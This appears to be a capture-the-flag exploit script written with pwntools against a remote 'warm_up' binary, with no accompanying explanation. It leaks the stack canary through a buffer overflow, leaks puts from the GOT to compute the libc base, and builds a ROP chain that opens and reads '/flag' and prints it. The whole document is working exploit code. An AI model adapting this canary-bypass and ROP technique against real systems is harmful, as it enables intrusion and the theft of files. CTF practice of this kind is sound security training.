from pwn import *

#io=process('./warm_up')
io=remote('139.129.76.65', '50007')
libc=ELF('./libc-2.23.so')
io.sendline('a'*0x10+'bbbbbbbb')
io.recvuntil('bbbbbbbb\n')
canary=u64('\x00'+io.recv(7))
print(hex(canary))
puts_got=0x0601028
puts_plt=0x0400870
main_add=0x0400AB6
pop_rdi=0x0400bc3


pl2='a'*0x18+p64(canary)+'cccccccc'+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_add)
io.sendline(pl2)
io.recvuntil('\x90')
puts_add=u64(('\x90'+io.recv(5)).ljust(8,'\x00'))
print(hex(puts_add))

libc_puts=libc.symbols['puts']
libcbase=puts_add-libc_puts
pop_rdx=0x1b92+libcbase
pop_rsi=0x0202e8+libcbase


open_add=libcbase+libc.symbols['open']
read_plt=0x04008D0
bss_add=0x0601080

io.recvuntil('warm up!!!')
io.sendline('aaaa')

#print(hex(canary2))

pl3='a'*0x18+p64(canary)+'cccccccc'
pl3+=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_add)+p64(pop_rdx)+p64(6)+p64(read_plt)
pl3+=p64(pop_rdi)+p64(bss_add)+p64(pop_rsi)+p64(0)+p64(open_add)
pl3+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss_add)+p64(pop_rdx)+p64(64)+p64(read_plt)
pl3+=p64(pop_rdi)+p64(bss_add)+p64(puts_plt)+p64(main_add)

io.sendline(pl3)
pause()
io.send('/flag\0')

io.interactive()